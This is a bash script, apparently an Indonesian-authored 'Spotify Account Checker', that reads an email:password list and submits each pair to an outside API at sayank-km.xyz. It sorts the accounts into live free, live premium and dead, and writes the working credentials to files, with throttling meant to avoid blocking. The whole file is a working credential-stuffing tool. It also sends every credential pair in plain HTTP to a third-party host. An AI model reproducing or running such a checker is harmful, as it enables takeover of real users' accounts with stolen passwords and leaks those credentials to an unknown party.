#!/bin/bash
# NTB 4 WORLD
#MinorityCode_
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
header () {
printf "${RED}
                ╦ ╦╦ ╦╔╗╔╔═╗
                ╚╦╝║ ║║║║╠═╣
                 ╩ ╚═╝╝╚╝╩ ╩                             
     ${RED}------------------------------------${NOCOLOR}
           Spotify Account Checker
     ${RED}------------------------------------${NOCOLOR}
"
}
spotify(){
  apine=$(curl -s "http://sayank-km.xyz/api/?email=$1&pass=$2" --compressed -s);
  cex=$( echo $apine | grep -ic "FREE")
  cox=$( echo $apine | grep -ic "PREMIUM")
    if [[ $cex == "1" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2 | [FREE]\n"
    echo "$1|$2 | $type" >> Spotify-LIVE-FREE.txt
    printf "${NOCOLOR}"
    elif [[ $cox == "1" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2 | [PREMIUM]\n"
    echo "$1|$2 | $type" >> Spotify-LIVE-PREMIUM.txt
    printf "${NOCOLOR}"
else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2 \n"
    echo "$1|$2" >> Spotify-DIE.txt
    printf "${NOCOLOR}"    
fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter List -> email:password "
echo -n "Input File List : "
    read list
    echo "[+] Calculate Files"
    echo "=============================="
    totalLines=`grep -c "@" $list`
    echo "There are $totalLines of list."
    echo "=============================="
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
persend=1 #NOSET BIAR GA KOID
setleep=5 #NOSET BIAR GA KOID
itung=1   #NOSET BIAR GA KOID
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
  set_kirik=$(expr $itung % $persend)
if [[ $set_kirik == 0 && $itung > 0 ]]; then
  sleep $setleep
fi
  emailna="${emailgblg[$i]}"
  passwordna="${passwordna[$i]}"

  spotify $emailna $passwordna&
  itung=$[$itung+1]
done
wait